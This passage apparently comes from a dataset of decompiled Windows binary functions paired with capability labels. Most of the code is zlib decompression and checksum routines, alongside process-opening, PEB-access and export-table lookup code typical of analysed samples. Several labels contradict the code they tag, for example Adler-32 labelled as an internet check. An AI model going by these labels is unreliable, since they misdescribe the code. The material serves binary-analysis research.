puVar3[7] = puVar3[7] + iVar9;\n        if ((puVar3[2] != 0) && (iVar9 != 0)) {\n            puVar10 = fcn.004047d0(iVar9);\n            puVar3[6] = puVar10;\n            param_1[0xc] = puVar10;\n        }\n        iVar9 = 0;\n        if (*puVar3 == 0xb) {\n            iVar9 = 0x80;\n        }\n        param_1[0xb] = (-(puVar3[1] != 0) & 0x40) + iVar9 + puVar3[0xf];\n        if (var_28h == 0) {\n            var_28h = -5;\n        }\n        return var_28h;\n    }\n    *puVar3 = 0x1c;\ncode_r0x004046c6:\n    return -4;\n}\n",
        "token_count": 10036
    },
    "004047d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004047d0(uint32_t arg_8h)\n\n{\n    uint32_t in_ECX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    uint8_t *in_EDX;\n    int32_t iVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    \n    uVar20 = in_ECX >> 0x10;\n    uVar1 = in_ECX & 0xffff;\n    if (arg_8h == 1) {\n        uVar1 = uVar1 + *in_EDX;\n        if (0xfff0 < uVar1) {\n            uVar1 = uVar1 - 0xfff1;\n        }\n        uVar20 = uVar20 + uVar1;\n        if (0xfff0 < uVar20) {\n            return (uVar20 - 0xfff1) * 0x10000 | uVar1;\n        }\n    }\n    else {\n        if (in_EDX == NULL) {\n            return 1;\n        }\n        if (arg_8h < 0x10) {\n            if (arg_8h != 0) {\n                do {\n                    uVar1 = uVar1 + *in_EDX;\n                    uVar20 = uVar20 + uVar1;\n                    in_EDX = in_EDX + 1;\n                    arg_8h = arg_8h - 1;\n                } while (arg_8h != 0);\n            }\n            if (0xfff0 < uVar1) {\n                uVar1 = uVar1 - 0xfff1;\n            }\n            return ((uVar20 / 0xfff1) * 0xf + uVar20) * 0x10000 | uVar1;\n        }\n        uVar19 = arg_8h;\n        if (0x15af < arg_8h) {\n            arg_8h = arg_8h / 0x15b0;\n            do {\n                uVar19 = uVar19 - 0x15b0;\n                iVar17 = 0x15b;\n                do {\n                    iVar2 = uVar1 + *in_EDX;\n                    iVar3 = iVar2 + in_EDX[1];\n                    iVar4 = iVar3 + in_EDX[2];\n                    iVar5 = iVar4 + in_EDX[3];\n                    iVar6 = iVar5 + in_EDX[4];\n                    iVar7 = iVar6 + in_EDX[5];\n                    iVar8 = iVar7 + in_EDX[6];\n                    iVar9 = iVar8 + in_EDX[7];\n                    iVar10 = iVar9 + in_EDX[8];\n                    iVar11 = iVar10 + in_EDX[9];\n                    iVar12 = iVar11 + in_EDX[10];\n                    iVar13 = iVar12 + in_EDX[0xb];\n                    iVar14 = iVar13 + in_EDX[0xc];\n                    iVar15 = iVar14 + in_EDX[0xd];\n                    iVar16 = iVar15 + in_EDX[0xe];\n                    uVar1 = iVar16 + in_EDX[0xf];\n                    uVar20 = uVar20 + iVar2 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 +\n                             iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + uVar1;\n                    in_EDX = in_EDX + 0x10;\n                    iVar17 = iVar17 + -1;\n                } while (iVar17 != 0);\n                uVar1 = uVar1 % 0xfff1;\n                uVar20 = uVar20 % 0xfff1;\n                arg_8h = arg_8h - 1;\n            } while (arg_8h != 0);\n        }\n        if (uVar19 != 0) {\n            if (0xf < uVar19) {\n                uVar18 = uVar19 >> 4;\n                do {\n                    iVar17 = uVar1 + *in_EDX;\n                    iVar2 = iVar17 + in_EDX[1];\n                    iVar3 = iVar2 + in_EDX[2];\n                    iVar4 = iVar3 + in_EDX[3];\n                    iVar5 = iVar4 + in_EDX[4];\n                    iVar6 = iVar5 + in_EDX[5];\n                    iVar7 = iVar6 + in_EDX[6];\n                    iVar8 = iVar7 + in_EDX[7];\n                    iVar9 = iVar8 + in_EDX[8];\n                    iVar10 = iVar9 + in_EDX[9];\n                    iVar11 = iVar10 + in_EDX[10];\n                    iVar12 = iVar11 + in_EDX[0xb];\n                    iVar13 = iVar12 + in_EDX[0xc];\n                    iVar14 = iVar13 + in_EDX[0xd];\n                    iVar15 = iVar14 + in_EDX[0xe];\n                    uVar1 = iVar15 + in_EDX[0xf];\n                    uVar19 = uVar19 - 0x10;\n                    uVar20 = uVar20 + iVar17 + iVar2 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 +\n                             iVar11 + iVar12 + iVar13 + iVar14 + iVar15 + uVar1;\n                    in_EDX = in_EDX + 0x10;\n                    uVar18 = uVar18 - 1;\n                } while (uVar18 != 0);\n            }\n            for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                uVar1 = uVar1 + *in_EDX;\n                uVar20 = uVar20 + uVar1;\n                in_EDX = in_EDX + 1;\n            }\n            uVar1 = uVar1 % 0xfff1;\n            uVar20 = uVar20 % 0xfff1;\n        }\n    }\n    return uVar20 << 0x10 | uVar1;\n}\n",
        "token_count": 1406
    },
    "00404a40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404a40(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint uVar8;\n    uint8_t *puVar9;\n    uint32_t uVar10;\n    uint8_t *puVar11;\n    uint *puVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    char cVar17;\n    int32_t iVar18;\n    uchar *puVar19;\n    uchar *puVar20;\n    uchar *puVar21;\n    uchar *puVar22;\n    uint32_t uVar23;\n    uchar *puVar24;\n    int32_t iVar25;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint8_t *var_8h;\n    uint32_t var_4h;\n    \n    iVar18 = param_1[7];\n    var_8h = *param_1 + -1;\n    puVar9 = var_8h + param_1[1] + -5;\n    iVar1 = param_1[4];\n    puVar19 = param_1[3] + -1;\n    iVar25 = *(iVar18 + 0x28);\n    uVar2 = *(iVar18 + 0x2c);\n    uVar3 = *(iVar18 + 0x30);\n    iVar4 = *(iVar18 + 0x34);\n    iVar5 = *(iVar18 + 0x4c);\n    iVar6 = *(iVar18 + 0x50);\n    var_4h = *(iVar18 + 0x38);\n    uVar23 = *(iVar18 + 0x3c);\n    uVar7 = *(iVar18 + 0x54);\n    uVar8 = *(param_1[7] + 0x58);\n    puVar21 = puVar19;\ncode_r0x00404ad0:\n    if (uVar23 < 0xf) {\n        puVar11 = var_8h + 1;\n        var_8h = var_8h + 2;\n        var_4h = var_4h + (*puVar11 << (uVar23 & 0x1f)) + (*var_8h << (uVar23 + 8 & 0x1f));\n        uVar23 = uVar23 + 0x10;\n    }\n    uVar15 = *(iVar5 + ((1 << (uVar7 & 0x1f)) - 1U & var_4h) * 4);\n    uVar13 = uVar15 >> 8 & 0xff;\n    var_4h = var_4h >> (uVar13 & 0x1f);\n    uVar23 = uVar23 - uVar13;\n    cVar17 = uVar15;\n    while (cVar17 != '\\0') {\n        if ((uVar15 & 0x10) != 0) {\n            uVar13 = uVar15 >> 0x10;\n            uVar15 = uVar15 & 0xf;\n            if (uVar15 != 0) {\n                if (uVar23 < uVar15) {\n                    var_8h = var_8h + 1;\n                    var_4h = var_4h + (*var_8h << (uVar23 & 0x1f));\n                    uVar23 = uVar23 + 8;\n                }\n                uVar10 = (1 << uVar15) - 1U & var_4h;\n                var_4h = var_4h >> uVar15;\n                uVar13 = uVar13 + uVar10;\n                uVar23 = uVar23 - uVar15;\n            }\n            if (uVar23 < 0xf) {\n                puVar11 = var_8h + 1;\n                var_8h = var_8h + 2;\n                var_4h = var_4h + (*puVar11 << (uVar23 & 0x1f)) + (*var_8h << (uVar23 + 8 & 0x1f));\n                uVar23 = uVar23 + 0x10;\n            }\n            uVar15 = *(iVar6 + ((1 << (uVar8 & 0x1f)) - 1U & var_4h) * 4);\n            uVar10 = uVar15 >> 8 & 0xff;\n            var_4h = var_4h >> (uVar10 & 0x1f);\n            uVar23 = uVar23 - uVar10;\n            goto joined_r0x00404be0;\n        }\n        if ((uVar15 & 0x40) != 0) {\n            puVar12 = param_1[7];\n            if ((uVar15 & 0x20) == 0) {\n                param_1[6] = 0x4021ac;\n                goto code_r0x00404e04;\n            }\n            *puVar12 = 0xb;\n            goto code_r0x00404e0a;\n        }\n        uVar15 = *(iVar5 + (((1 << (uVar15 & 0x1f)) - 1U & var_4h) + (uVar15 >> 0x10)) * 4);\n        uVar13 = uVar15 >> 8 & 0xff;\n        var_4h = var_4h >> (uVar13 & 0x1f);\n        uVar23 = uVar23 - uVar13;\n        cVar17 = uVar15;\n    }\n    puVar21[1] = uVar15 >> 0x10;\n    puVar22 = puVar21 + 1;\n    goto code_r0x00404d67;\njoined_r0x00404be0:\n    if ((uVar15 & 0x10) != 0) goto code_r0x00404c26;\n    if ((uVar15 & 0x40) != 0) {\n        param_1[6] = 0x4021c8;\n        goto code_r0x00404dfe;\n    }\n    uVar15 = *(iVar6 + (((1 << (uVar15 & 0x1f)) - 1U & var_4h) + (uVar15 >> 0x10)) * 4);\n    uVar10 = uVar15 >> 8 & 0xff;\n    var_4h = var_4h >> (uVar10 & 0x1f);\n    uVar23 = uVar23 - uVar10;\n    goto joined_r0x00404be0;\ncode_r0x00404c26:\n    uVar16 = uVar15 & 0xf;\n    uVar10 = uVar23;\n    puVar11 = var_8h;\n    if (uVar23 < uVar16) {\n        uVar10 = uVar23 + 8;\n        var_4h = var_4h + (var_8h[1] << (uVar23 & 0x1f));\n        puVar11 = var_8h + 1;\n        if (uVar10 < uVar16) {\n            var_4h = var_4h + (var_8h[2] << (uVar10 & 0x1f));\n            uVar10 = uVar23 + 0x10;\n            puVar11 = var_8h + 2;\n        }\n    }\n    var_8h = puVar11;\n    uVar23 = uVar10 - uVar16;\n    uVar10 = (1 << uVar16) - 1U & var_4h;\n    var_4h = var_4h >> uVar16;\n    uVar10 = (uVar15 >> 0x10) + uVar10;\n    if (uVar10 <= puVar21 - (puVar19 + (iVar1 - param_2))) {\n        iVar18 = puVar21 - uVar10;\n        do {\n            puVar20 = puVar21;\n            iVar14 = iVar18;\n            puVar20[1] = *(iVar14 + 1);\n            puVar20[2] = *(iVar14 + 2);\n            puVar21 = puVar20 + 3;\n            uVar13 = uVar13 - 3;\n            *puVar21 = *(iVar14 + 3);\n            iVar18 = iVar14 + 3;\n        } while (2 < uVar13);\n        puVar22 = puVar21;\n        if (uVar13 != 0) {\n            puVar20[4] = *(iVar14 + 4);\n            puVar22 = puVar20 + 4;\n            if (1 < uVar13) {\n                puVar20[5] = *(iVar14 + 5);\n                puVar22 = puVar20 + 5;\n            }\n        }\n        goto code_r0x00404d67;\n    }\n    uVar15 = uVar10 - (puVar21 - (puVar19 + (iVar1 - param_2)));\n    if (uVar2 < uVar15) {\n        param_1[6] = 0x4021e0;\ncode_r0x00404dfe:\n        puVar12 = param_1[7];\ncode_r0x00404e04:\n        *puVar12 = 0x1b;\ncode_r0x00404e0a:\n        iVar18 = var_8h - (uVar23 >> 3);\n        iVar25 = uVar23 - (uVar23 & 0xfffffff8);\n        *param_1 = iVar18 + 1;\n        param_1[3] = puVar21 + 1;\n        param_1[1] = puVar9 + (5 - iVar18);\n        iVar18 = param_1[7];\n        *(iVar18 + 0x3c) = iVar25;\n        param_1[4] = puVar19 + iVar1 + -0x101 + (0x101 - puVar21);\n        *(iVar18 + 0x38) = var_4h & (1 << (iVar25 & 0x1f)) - 1U;\n        return;\n    }\n    iVar18 = iVar4 + -1;\n    puVar20 = puVar21;\n    if (uVar3 == 0) {\n        puVar24 = iVar18 + (iVar25 - uVar15);\n        if (uVar15 < uVar13) {\n            uVar13 = uVar13 - uVar15;\n            do {\n                puVar21 = puVar24 + 1;\n                puVar24 = puVar24 + 1;\n                puVar20 = puVar20 + 1;\n                *puVar20 = *puVar21;\n                uVar15 = uVar15 - 1;\n            } while (uVar15 != 0);\ncode_r0x00404d14:\n            puVar24 = puVar20 + -uVar10;\n            puVar21 = puVar20;\n        }\n    }\n    else if (uVar3 < uVar15) {\n        uVar16 = uVar15 - uVar3;\n        puVar24 = iVar18 + (uVar3 - uVar15) + iVar25;\n        if (uVar16 < uVar13) {\n            uVar13 = uVar13 - uVar16;\n            do {\n                puVar22 = puVar20 + puVar24 + (1 - puVar21);\n                puVar20 = puVar20 + 1;\n                *puVar20 = *puVar22;\n                uVar16 = uVar16 - 1;\n            } while (uVar16 != 0);\n            puVar24 = iVar4 + -1;\n            puVar21 = puVar20;\n            if (uVar3 < uVar13) {\n                uVar13 = uVar13 - uVar3;\n                uVar15 = uVar3;\n                do {\n                    puVar21 = puVar24 + 1;\n                    puVar24 = puVar24 + 1;\n                    puVar20 = puVar20 + 1;\n                    *puVar20 = *puVar21;\n                    uVar15 = uVar15 - 1;\n                } while (uVar15 != 0);\n                goto code_r0x00404d14;\n            }\n        }\n    }\n    else {\n        puVar24 = iVar18 + (uVar3 - uVar15);\n        if (uVar15 < uVar13) {\n            uVar13 = uVar13 - uVar15;\n            do {\n                puVar21 = puVar24 + 1;\n                puVar24 = puVar24 + 1;\n                puVar20 = puVar20 + 1;\n                *puVar20 = *puVar21;\n                uVar15 = uVar15 - 1;\n            } while (uVar15 != 0);\n            goto code_r0x00404d14;\n        }\n    }\n    if (2 < uVar13) {\n        iVar18 = (uVar13 - 3) / 3 + 1;\n        do {\n            puVar21[1] = puVar24[1];\n            puVar20 = puVar24 + 2;\n            puVar24 = puVar24 + 3;\n            puVar21[2] = *puVar20;\n            puVar21 = puVar21 + 3;\n            uVar13 = uVar13 - 3;\n            *puVar21 = *puVar24;\n            iVar18 = iVar18 + -1;\n        } while (iVar18 != 0);\n    }\n    puVar22 = puVar21;\n    if (uVar13 != 0) {\n        puVar22 = puVar21 + 1;\n        *puVar22 = puVar24[1];\n        if (1 < uVar13) {\n            puVar22 = puVar21 + 2;\n            *puVar22 = puVar24[2];\n        }\n    }\ncode_r0x00404d67:\n    puVar21 = puVar22;\n    if ((puVar9 <= var_8h) || (puVar19 + iVar1 + -0x101 <= puVar22)) goto code_r0x00404e0a;\n    goto code_r0x00404ad0;\n}\n",
        "token_count": 3276
    },
    "00404ec0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404ec0(uint32_t arg_8h, int32_t *arg_ch, uint32_t *arg_10h, uint16_t *arg_14h)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t in_ECX;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint8_t uVar12;\n    int32_t in_EDX;\n    int32_t iVar13;\n    uint16_t *puVar14;\n    uint16_t var_88h;\n    uint var_86h;\n    uint32_t var_68h;\n    uint32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint32_t var_3ch;\n    uint32_t var_38h;\n    uint16_t *var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint16_t *var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_60h = 0;\n    var_5ch = 0;\n    var_58h = 0;\n    var_54h = 0;\n    var_50h = 0;\n    var_4ch = 0;\n    var_48h = 0;\n    var_44h = 0;\n    uVar7 = 0;\n    var_40h = in_EDX;\n    var_20h = in_ECX;\n    if (arg_8h != 0) {\n        do {\n            iVar6 = uVar7 * 2;\n            uVar7 = uVar7 + 1;\n            piVar1 = &var_60h + *(in_EDX + iVar6) * 2;\n            *piVar1 = *piVar1 + 1;\n        } while (uVar7 < arg_8h);\n    }\n    iVar6 = var_40h;\n    var_24h = 0xf;\n    do {\n        if (*(&var_60h + var_24h * 2) != 0) break;\n        var_24h = var_24h - 1;\n    } while (var_24h != 0);\n    var_10h = *arg_10h;\n    if (var_24h < *arg_10h) {\n        var_10h = var_24h;\n    }\n    if (var_24h == 0) {\n        **arg_ch = 0x140;\n        *arg_ch = *arg_ch + 4;\n        **arg_ch = 0x140;\n        *arg_ch = *arg_ch + 4;\n        *arg_10h = 1;\n        return 0;\n    }\n    var_8h = 1;\n    do {\n        if (*(&var_60h + var_8h * 2) != 0) break;\n        if (*(&var_60h + var_8h * 2 + 2) != 0) {\n            var_8h = var_8h + 1;\ncode_r0x00404fa9:\n            break;\n        }\n        if (*(&var_5ch + var_8h * 2) != 0) {\n            var_8h = var_8h + 2;\n            goto code_r0x00404fa9;\n        }\n        if (*(&var_5ch + var_8h * 2 + 2) != 0) {\n            var_8h = var_8h + 3;\n            goto code_r0x00404fa9;\n        }\n        if (*(&var_58h + var_8h * 2) != 0) {\n            var_8h = var_8h + 4;\n            goto code_r0x00404fa9;\n        }\n        var_8h = var_8h + 5;\n    } while (var_8h < 0x10);\n    uVar7 = var_8h;\n    if (var_10h < var_8h) {\n        var_10h = var_8h;\n    }\n    iVar13 = 1;\n    uVar8 = 1;\n    do {\n        iVar13 = iVar13 * 2 - *(&var_60h + uVar8 * 2);\n        if (iVar13 < 0) {\n            return 0xffffffff;\n        }\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x10);\n    if ((0 < iVar13) && ((var_20h == 0 || (var_24h != 1)))) {\n        return 0xffffffff;\n    }\n    var_86h._0_2_ = 0;\n    uVar8 = 2;\n    do {\n        uVar9 = uVar8 + 2;\n        *(&var_86h + uVar8) = *(&var_88h + uVar8) + *(&var_60h + uVar8);\n        uVar8 = uVar9;\n    } while (uVar9 < 0x1e);\n    uVar8 = 0;\n    if (arg_8h != 0) {\n        do {\n            uVar4 = *(iVar6 + uVar8 * 2);\n            if (uVar4 != 0) {\n                arg_14h[(&var_88h)[uVar4]] = uVar8;\n                (&var_88h)[*(iVar6 + uVar8 * 2)] = (&var_88h)[*(iVar6 + uVar8 * 2)] + 1;\n            }\n            uVar8 = uVar8 + 1;\n        } while (uVar8 < arg_8h);\n    }\n    if (var_20h == 0) {\n        var_28h = arg_14h;\n        var_18h = 0x13;\n        var_34h = arg_14h;\n    }\n    else {\n        if (var_20h != 1) {\n            var_28h = 0x401fb0;\n            var_34h = 0x402060;\n            var_18h = -1;\n            goto code_r0x004050ab;\n        }\n        var_28h = 0x401dee;\n        var_18h = 0x100;\n        var_34h = 0x401d6e;\n    }\ncode_r0x004050ab:\n    var_ch = *arg_ch;\n    var_38h = 1 << (var_10h & 0x1f);\n    uVar8 = 0;\n    var_4h = 0;\n    var_30h = 0xffffffff;\n    var_2ch = var_38h;\n    var_3ch = var_38h - 1;\n    uVar9 = var_24h;\n    if ((var_20h != 1) || (var_38h < 0x5b0)) {\ncode_r0x004050f0:\n        do {\n            do {\n                uVar11 = var_38h;\n                cVar2 = uVar7;\n                uVar12 = var_4h;\n                uVar3 = cVar2 - uVar12;\n                uVar4 = *arg_14h;\n                uVar5 = uVar4;\n                if (uVar5 < var_18h) {\n                    arg_8h._0_2_ = uVar3 << 8;\n                }\n                else {\n                    arg_8h._1_3_ = uVar3;\n                    if (var_18h < uVar5) {\n                        arg_8h._0_2_ = CONCAT11(uVar3, *(var_34h + uVar5));\n                        uVar4 = var_28h[uVar5];\n                    }\n                    else {\n                        arg_8h = CONCAT31(arg_8h._1_3_, 0x60);\n                        uVar4 = 0;\n                    }\n                }\n                arg_8h = CONCAT22(uVar4, arg_8h);\n                iVar6 = 1 << (cVar2 - uVar12 & 0x1f);\n                var_64h = var_38h;\n                var_14h = iVar6 * 4;\n                puVar10 = var_ch + ((uVar8 >> (uVar12 & 0x1f)) + var_38h) * 4;\n                uVar5 = var_38h;\n                do {\n                    puVar10 = puVar10 + -iVar6;\n                    *puVar10 = arg_8h;\n                    uVar5 = uVar5 - iVar6;\n                } while (uVar5 != 0);\n                for (uVar5 = 1 << (cVar2 - 1U & 0x1f); (uVar8 & uVar5) != 0; uVar5 = uVar5 >> 1) {\n                }\n                if (uVar5 == 0) {\n                    var_1ch = 0;\n                }\n                else {\n                    var_1ch = (uVar5 - 1 & uVar8) + uVar5;\n                }\n                uVar8 = var_1ch;\n                arg_14h = arg_14h + 1;\n                piVar1 = &var_60h + uVar7 * 2;\n                *piVar1 = *piVar1 + -1;\n                if (*piVar1 == 0) {\n                    if (uVar7 == uVar9) {\n                        arg_8h._1_3_ = cVar2 - var_4h;\n                        arg_8h = CONCAT31(arg_8h._1_3_, 0x40);\n                        goto joined_r0x004052a5;\n                    }\n                    uVar7 = *(var_40h + *arg_14h * 2);\n                    var_8h = uVar7;\n                }\n            } while (uVar7 <= var_10h);\n            var_68h = var_3ch & uVar8;\n        } while (var_68h == var_30h);\n        if (var_4h == 0) {\n            var_4h = var_10h;\n        }\n        var_ch = var_ch + uVar11 * 4;\n        var_14h = uVar7 - var_4h;\n        iVar6 = 1 << (var_14h & 0x1f);\n        uVar11 = var_4h + var_14h;\n        if (uVar11 < uVar9) {\n            puVar14 = &var_60h + uVar11 * 2;\n            do {\n                uVar4 = *puVar14;\n                uVar7 = var_8h;\n                uVar8 = var_1ch;\n                uVar9 = var_24h;\n                if (iVar6 - uVar4 < 1) break;\n                uVar11 = uVar11 + 1;\n                var_14h = var_14h + 1;\n                puVar14 = puVar14 + 1;\n                iVar6 = (iVar6 - uVar4) * 2;\n            } while (uVar11 < var_24h);\n        }\n        var_38h = 1 << (var_14h & 0x1f);\n        var_2ch = var_2ch + var_38h;\n        if ((var_20h != 1) || (var_2ch < 0x5b0)) {\n            var_30h = var_68h;\n            *(*arg_ch + var_68h * 4) = var_14h;\n            *(*arg_ch + 1 + var_68h * 4) = var_10h;\n            *(*arg_ch + 2 + var_68h * 4) = var_ch - *arg_ch >> 2;\n            goto code_r0x004050f0;\n        }\n    }\n    return 1;\njoined_r0x004052a5:\n    if (uVar8 == 0) {\ncode_r0x00405306:\n        *arg_ch = *arg_ch + var_2ch * 4;\n        *arg_10h = var_10h;\n        return 0;\n    }\n    if ((var_4h != 0) && ((var_3ch & uVar8) != var_30h)) {\n        var_ch = *arg_ch;\n        var_4h = 0;\n        arg_8h._0_2_ = CONCAT11(var_10h, arg_8h);\n        arg_8h = arg_8h;\n        uVar7 = var_10h;\n    }\n    *(var_ch + (uVar8 >> (var_4h & 0x1f)) * 4) = arg_8h;\n    for (uVar9 = 1 << (uVar7 - 1U & 0x1f); (uVar8 & uVar9) != 0; uVar9 = uVar9 >> 1) {\n    }\n    if (uVar9 == 0) goto code_r0x00405306;\n    uVar8 = (uVar8 & uVar9 - 1) + uVar9;\n    goto joined_r0x004052a5;\n}\n",
        "token_count": 3097
    },
    "004024ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004024ca(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040244a(arg_8h);\n    (**0x406020)(*0x40645c * 2 + 0x406048, arg_8h, iVar1 * 2);\n    *((*0x40645c + iVar1) * 2 + 0x406048) = 0;\n    *0x40645c = *0x40645c + iVar1;\n    return;\n}\n",
        "token_count": 122
    },
    "00402567": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00402567(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_4h;\n    \n    iVar4 = 0;\n    iVar1 = *(param_1 + 0x3c);\n    uVar5 = 0;\n    uVar2 = *(iVar1 + 6 + param_1);\n    if (uVar2 != 0) {\n        puVar3 = param_1 + 0x2c + iVar1 + *(iVar1 + 0x14 + param_1);\n        do {\n            if ((puVar3[-1] != 0) && (iVar4 = puVar3[-1] + *puVar3 + param_1,  (*puVar3 & 0x11) == 0x111)) break;\n            puVar3 = puVar3 + 10;\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < uVar2);\n    }\n    return iVar4 - param_1;\n}\n",
        "token_count": 259
    },
    "004025be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004025be(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar6 = 0;\n    if (*(*(param_1 + 0x3c) + 0x7c + param_1) != 0) {\n        iVar2 = *(*(param_1 + 0x3c) + 0x78 + param_1) + param_1;\n        iVar4 = *(iVar2 + 0x1c);\n        iVar1 = *(iVar2 + 0x20);\n        uVar5 = 0;\n        if (*(iVar2 + 0x14) != 0) {\n            do {\n                iVar3 = (**0x406014)(*(iVar1 + param_1 + uVar5 * 4) + param_1, 0x4015c0);\n                if (iVar3 == 0) {\n                    iVar6 = *(iVar4 + param_1 + *(*(iVar2 + 0x24) + uVar5 * 2 + param_1) * 4) + param_1;\n                    break;\n                }\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < *(iVar2 + 0x14));\n        }\n    }\n    iVar4 = fcn.00403565();\n    if (0x7fff < iVar4 - *0x406040) {\n        iVar6 = 0;\n    }\n    return iVar6;\n}\n",
        "token_count": 378
    },
    "004034c9": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nuint fcn.004034c9(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_FS_OFFSET;\n    uint var_38h;\n    uint var_30h;\n    uint var_4h;\n    \n    cVar1 = fcn.0040350a();\n    if (cVar1 == '\\0') {\n        return *(*(in_FS_OFFSET + 0x18) + 0x30);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0, &var_38h, 0x30, &var_4h);\n    iVar3 = (**0x406024)(uVar2);\n    if (iVar3 != 0) {\n        var_30h = 0;\n    }\n    return var_30h;\n}\n",
        "token_count": 185
    },
    "0040345d": {
        "rules": [
            "open process"
        ],
        "decompiled_code": "\nint32_t fcn.0040345d(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    uint arg_ch;\n    uint uVar3;\n    uint var_1ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0, &var_1ch, 0x18, &var_4h);\n    iVar2 = (**0x406028)(uVar1);\n    if (iVar2 < 0) {\n        fcn.004024ca(0x401210);\n        return 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1f0fff, 0, var_8h);\n    if (iVar2 == 0) {\n        uVar3 = 0x401224;\n        uVar1 = extraout_ECX;\n        fcn.004024ca(0x401224);\n        arg_ch = 10;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(10, uVar3, uVar1);\n        fcn.00402463(uVar1, arg_ch);\n    }\n    return iVar2;\n}\n",
        "token_count": 276
    },
    "00402342": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
